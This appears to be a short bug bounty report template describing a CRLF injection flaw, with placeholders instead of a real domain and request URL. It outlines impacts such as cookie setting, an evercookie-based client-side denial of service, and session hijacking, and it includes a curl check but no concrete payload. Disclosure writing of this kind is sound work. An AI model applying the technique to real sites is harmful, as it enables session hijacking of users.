# CRLF injection in $domain

$domain is vulnerable to CRLF injection â€” an attacker can set cookies on behalf of the victim. On top of that, since this is a subdomain of $base, I can set cookies for $base too.

$ curl $request | grep "crlf"

# PoC

Browse to this URL and check the response header: $request

# Impact

One can set cookies. I could create an evercookie bomb, which would escalate this issue to persistent client-side DoS. I can also set session cookies on behalf of a user and hijack their session.
